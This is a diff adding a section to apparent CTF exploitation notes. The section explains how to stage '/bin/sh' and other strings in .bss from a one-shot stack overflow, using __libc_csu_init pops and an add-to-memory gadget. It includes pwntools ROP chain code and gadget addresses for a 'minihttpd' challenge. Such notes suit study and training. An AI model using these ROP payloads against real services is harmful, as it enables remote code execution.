@@ -776,6 +776,38 @@ payload = flat(b"/bin/sh\x00", b"\x00"*0x20, elf.plt["signal"], bytes(frame))
 
 `jmp` (not `call`) to `plt.signal`: a `call` pushes a return address that shifts the `SigreturnFrame` the `syscall` is about to read. The overwritten GOT entry runs `mov rax, 0xf; syscall`, the kernel restores your frame, and control continues at `frame.rip`.
 
+### When the target gives you only one read/recv
+
+Request-driven services (an HTTP parser, a fixed handshake) hand you exactly one stack smash - there is no second `read()` in which to stash `/flag`, `/bin/sh` or a mode string. The add primitive is enough to synthesise those bytes, because `.bss` is zero-initialised:
+
+1. `__libc_csu_init`'s epilogue is a six-pop gadget - `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` (`0x402fea` in `minihttpd`).
+2. Load `rbx` with the 32-bit chunk, `rbp` with `target + 0x3d`, then `ret` straight to the magic gadget. Do **not** route through the other half (`mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]`): with `rbx` carrying an addend, `[r15+rbx*8]` is a wild pointer.
+3. Repeat once per 4-byte chunk.
+
+```python
+csu_pop    = 0x402fea        # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+add_gadget = 0x40169c        # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+dst        = 0x406040        # zeroed .bss
+
+def add32(where, value):
+    return flat(csu_pop, value & 0xffffffff, where + 0x3d, 0, 0, 0, 0, add_gadget)
+
+chain  = add32(dst, 0x6e69622f)        # "/bin"
+chain += add32(dst + 4, 0x0068732f)    # "/sh\x00"
+# dst now contains "/bin/sh\x00" without a second write primitive
+```
+
+- The addend is `ebx` - the **low 32 bits of `rbx`** - so the arithmetic is 32-bit two's complement: `0xffffffff` subtracts 1, `0xffbfbc94` subtracts `0x40436c`. Any 8-byte string is two adds; a pointer adjustment is one add per dword.
+- `rbp` must be `target + 0x3d` because the gadget hard-codes `[rbp - 0x3d]`.
+- The gadget ends with `nop; ret`, so the next qword continues the chain - you can go straight into another `add32` or into `pop rdi; ret`.
+- The same trick stages the `fopen`/`open` mode string (`"r\x00"` = `0x72`) or any constant the payload needs.
+
+```python
+chain += flat(pop_rdi_ret, dst, pop_rsi_ret, dst + 0x20, fopen_plt)   # fopen("/bin/sh", "r")
+```
+
+**Why this matters:** it turns a one-shot stack overflow into a self-writing ROP payload - no `read`, no `gets`, no heap primitive needed to stage strings - which is exactly how `minihttpd` builds its path/mode constants before calling `fopen`.
+
 ### Requirements and limits
 
 - **Only adds** - the write is `mem[...] += ebx`. Every delta must be a multiple of the step you can build (`dh` from a stale register, or any `add bl, imm`/`mov ebx, imm` gadget you can find).
@@ -783,7 +815,7 @@ payload = flat(b"/bin/sh\x00", b"\x00"*0x20, elf.plt["signal"], bytes(frame))
 - Deltas are per-libc-build: recompute `target - resolved_function` from the shipped `libc.so.6`; a different libc build invalidates them.
 - The gadget writes to memory: it needs the target dword to be **writable**. Partial RELRO (`BIND_NOW` off) leaves `.got.plt` writable, which is why a GOT retarget works; under **Full RELRO / `BIND_NOW`** the GOT is read-only, so aim the same add at `.fini_array`, a function-pointer table in `.bss`, or another writable dword.
 
-**References:** N1CTF Junior 2026 - Onlyfgets (`solve.py` in `/CTF/contest/N1CTF-Junior/2026-1/Onlyfgets`); CISCN - minihttpd carries the same magic gadget at `0x40169c`.
+**References:** N1CTF Junior 2026 - Onlyfgets (`solve.py`); CISCN - minihttpd (`exp.py`, magic gadget `0x40169c`, csu pops `0x402fea`, csu call `0x402fd0`, `fopen@plt` at `0x402c87`).
 
 ## Useful Commands
 
